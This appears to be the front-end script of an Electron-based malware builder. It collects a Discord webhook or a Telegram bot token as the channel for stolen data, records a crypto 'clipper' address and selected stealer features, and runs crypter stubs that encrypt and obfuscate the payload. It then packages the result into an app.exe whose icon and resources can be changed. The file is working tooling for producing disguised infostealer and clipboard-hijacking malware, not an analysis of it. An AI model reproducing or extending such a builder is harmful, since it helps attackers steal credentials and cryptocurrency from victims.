const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const https = require('https');

let outputBox = null;

const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn');

togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});

function appendToOutputBox(html) {
    if (!outputBox) return;
    const div = document.createElement('div');
    div.className = 'log-message';
    div.innerHTML = html;
    outputBox.appendChild(div);
    outputBox.scrollTop = outputBox.scrollHeight;
}

function displayMessages(messages, index = 0) {
    if (index >= messages.length) return;
    appendToOutputBox(messages[index]);
    setTimeout(() => displayMessages(messages, index + 1), 600);
}

function runScriptFile(scriptFilePath, showOutputOnSuccess = false) {
    return new Promise((resolve, reject) => {
        exec(`node "${scriptFilePath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing ${scriptFilePath}: ${error}`);
                appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Error executing ${scriptFilePath}: ${error.message}`);
                appendToOutputBox(`<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}`);
                reject(error);
                return;
            }
            if (stderr) {
                console.error(`stderr Error: ${stderr}`);
                appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> stderr Error: ${stderr}`);
                appendToOutputBox(`<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}`);
                reject(new Error(stderr));
                return;
            }
            if (showOutputOnSuccess) {
                const filteredOutput = stdout
                    .split('\n')
                    .filter(line => !line.includes('add:') && !line.includes('del:') && !line.includes('not found:'))
                    .join('\n');
                appendToOutputBox(`<i class='bx bx-check-square' style='color:#00ff0f'></i> ${scriptFilePath} was executed successfully.`);
                appendToOutputBox(`<i class='bx bx-file' style='color:#000000'></i> Output: ${filteredOutput.replace(/\n/g, '<br>')}`);
            }
            resolve();
        });
    });
}

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function build() {
    return new Promise((resolve, reject) => {
        const buildPath = path.resolve(__dirname, '..', '..', 'build');

        const command = `npx pkg . --output app.exe --targets node14-win-x64 --compress=GZip`;

        console.log(`Executing build in: ${buildPath}`);

        exec(command, { cwd: buildPath, env: { ...process.env, NODE_NO_WARNINGS: '1' } }, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing pkg command: ${error}`);
                // If it's a 'not found' error, give a clearer message
                if (error.message.includes('not recognized') || error.message.includes('not found')) {
                    appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Error: 'pkg' command failed. Please make sure you ran install.bat first.`);
                } else {
                    appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Build Error: ${error.message}`);
                }
                appendToOutputBox(`<i class='bx bx-file' style='color:#000000'></i> Output: ${stdout.replace(/\n/g, '<br>')}`);
                reject(error);
                return;
            }
            // pkg sometimes writes progress to stderr, so we only reject if it's a real error
            if (stderr && stderr.toLowerCase().includes('error')) {
                console.error(`stderr Error: ${stderr}`);
                appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Build Warning/Error: ${stderr}`);
                // We don't necessarily reject here because pkg often uses stderr for logs
            }
            console.log('pkg command executed successfully.');
            appendToOutputBox(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Compilation Completed Successfully !`);
            setTimeout(() => {
                appendToOutputBox(`<i class='bx bx-help-circle' style='color:#6699CC'></i> Click the button in the top right to change the EXE resources.`);
                document.getElementById('helpButton').style.display = 'block';
                const modal = document.getElementById('resourceModal');
                const helpBtn = document.getElementById('helpButton');
                if (modal && helpBtn) {
                    helpBtn.onclick = function () {
                        modal.classList.add('active');
                        if (window.initResourcePopup) {
                            window.initResourcePopup();
                        }
                    };
                }
                resolve();
            }, 200);
        });
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const buildButton = document.querySelector('label[for="fileInput"]');
    outputBox = document.getElementById('outputBox');
    const helpButton = document.getElementById('helpButton');
    const newButton = document.getElementById('newButton');
    helpButton.style.display = 'none';
    newButton.style.display = 'none';

    function checkInfo() {
        const discordWebhookURL = localStorage.getItem('discordWebhookURL');
        const telegramBotToken = localStorage.getItem('telegramBotToken');
        const telegramChatID = localStorage.getItem('telegramChatID');
        if (discordWebhookURL || (telegramBotToken && telegramChatID)) {
            if (discordWebhookURL) {
                return { method: 'Discord Webhook', discordWebhookURL };
            } else {
                return { method: 'Telegram Bot', telegramBotToken, telegramChatID };
            }
        }
        return null;
    }

    const { ipcRenderer } = require('electron');

    async function loadSavedInfoToLocalStorage() {
        try {
            const data = await ipcRenderer.invoke('get-info');
            if (data) {
                if (data.discordWebhookURL) localStorage.setItem('discordWebhookURL', data.discordWebhookURL);
                if (data.telegramBotToken) localStorage.setItem('telegramBotToken', data.telegramBotToken);
                if (data.telegramChatID) localStorage.setItem('telegramChatID', data.telegramChatID);
            }
        } catch (error) {
            console.error('Failed to load saved info to localStorage:', error);
        }
    }

    loadSavedInfoToLocalStorage();

    function getCheckboxStates() {
        return new Promise((resolve, reject) => {
            const filePath = path.resolve(__dirname, 'checkbox.json');
            fs.readFile(filePath, 'utf8', (err, data) => {
                if (err) {
                    console.error('Error reading checkbox.json:', err);
                    reject(err);
                    return;
                }
                try {
                    const jsonData = JSON.parse(data);
                    resolve(jsonData);
                } catch (parseError) {
                    console.error('Error parsing checkbox.json:', parseError);
                    reject(parseError);
                }
            });
        });
    }

    function findAppExe() {
        return new Promise((resolve, reject) => {
            const dirsToCheck = [path.resolve(__dirname, '../../'), path.resolve(__dirname, '../')];
            let foundPath = null;
            for (const dir of dirsToCheck) {
                const filePath = path.join(dir, 'app.exe');
                if (fs.existsSync(filePath)) {
                    foundPath = filePath;
                    break;
                }
            }
            if (foundPath) {
                resolve(foundPath);
            } else {
                reject(new Error('app.exe not found'));
            }
        });
    }

    function displayMessagesLocal(messages, isReadyToFinalize) {
        return new Promise((resolve) => {
            let index = 0;
            function showNextMessage() {
                if (index < messages.length) {
                    appendToOutputBox(messages[index]);
                    index++;
                    setTimeout(showNextMessage, 1600);
                } else if (isReadyToFinalize && isReadyToFinalize()) {
                    resolve();
                } else {
                    setTimeout(showNextMessage, 500);
                }
            }
            showNextMessage();
        });
    }

    buildButton.addEventListener('click', () => {
        const info = checkInfo();
        if (!info) {
            window.location.href = 'info.html?error=missing_info';
            return;
        }
        getCheckboxStates().then(checkboxStates => {
            const checkedCheckboxIDs = Object.keys(checkboxStates).filter(id => checkboxStates[id]);
            const checkedCheckboxIDsStr = checkedCheckboxIDs.join(' | ');
            let messages = [
                `<i class='bx bx-check-square' style='color:#00ff0f'></i> Build initialized!`,
                `<i class='bx bx-check-square' style='color:#00ff0f'></i> Features Saved!`,
                `<i class='bx bx-check-square' style='color:#00ff0f'></i> Clipper adress saved!`,
                `<i class='bx bx-check-square' style='color:#00ff0f'></i> Method: ${info.method}`
            ];
            const { method, discordWebhookURL, telegramBotToken, telegramChatID } = info;
            outputBox.innerHTML = '';
            let compilationReady = false;
            const displayPromise = displayMessagesLocal(messages, () => compilationReady);
            const featuresFilePath = path.resolve(__dirname, '../../stub/features.js');
            runScriptFile(featuresFilePath, false)
                .then(() => {
                    let scriptFilePath;
                    if (method === 'Discord Webhook') {
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Discord Webhook URL: ${discordWebhookURL}`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Features chosen: ${checkedCheckboxIDsStr}`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> AES256 Encryption Success!`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> JS Confuser Encryption Success!`);
                        scriptFilePath = path.resolve(__dirname, '../../stub/crypter.js');
                    } else if (method === 'Telegram Bot') {
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Telegram Bot Token: ${telegramBotToken}`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Telegram Chat ID: ${telegramChatID}`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> Features chosen: ${checkedCheckboxIDsStr}`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> AES256 Encryption Success!`);
                        messages.push(`<i class='bx bx-check-square' style='color:#00ff0f'></i> JS Confuser Encryption Success!`);
                        scriptFilePath = path.resolve(__dirname, '../../stub/cryptertele.js');
                    }
                    if (scriptFilePath) {
                        return runScriptFile(scriptFilePath).then(() => {
                            compilationReady = true;
                        });
                    } else {
                        throw new Error('No valid script file path provided');
                    }
                })
                .then(() => displayPromise)
                .then(() => {
                    const div = document.createElement('div');
                    div.id = 'finalizing-msg';
                    div.className = 'log-message';
                    div.innerHTML = `<i class='bx bx-sync bx-spin' style='color:#6699CC'></i> <span class="dots">Finalizing</span>`;
                    outputBox.appendChild(div);
                    outputBox.scrollTop = outputBox.scrollHeight;
                    return delay(2000);
                })
                .then(() => build())
                .then(() => {
                    const msg = document.getElementById('finalizing-msg');
                    if (msg) msg.remove();
                    helpButton.style.display = 'block';
                    newButton.style.display = 'block';
                    const modal = document.getElementById('resourceModal');
                    if (modal && helpButton) {
                        helpButton.onclick = function () {
                            modal.classList.add('active');
                            if (window.initResourcePopup) {
                                window.initResourcePopup();
                            }
                        };
                    }
                })
                .catch(error => {
                    const msg = document.getElementById('finalizing-msg');
                    if (msg) msg.remove();
                    console.error('Error during build process:', error);
                    appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Error during build process: ${error.message}`);
                });
        }).catch(error => {
            console.error('Error getting checkbox states:', error);
            appendToOutputBox(`<i class='bx bx-error' style='color:#ff0000'></i> Error getting checkbox states: ${error.message}`);
        });
    });

    function handleButtonClick() {
        findAppExe()
            .then(filePath => {
                showNotification(`Full path of the app.exe file: ${filePath}`, 'info');
            })
            .catch(error => {
                showNotification(`Error: ${error.message}`, 'error');
            });
    }

    newButton.addEventListener('click', () => {
        if (window.applyDefaultResources) {
            window.applyDefaultResources();
        } else {
            console.error('window.applyDefaultResources not defined!');
            showNotification('Error: Default logic not loaded.', 'error');
        }
        helpButton.style.display = 'none';
        newButton.style.display = 'none';
    });
});
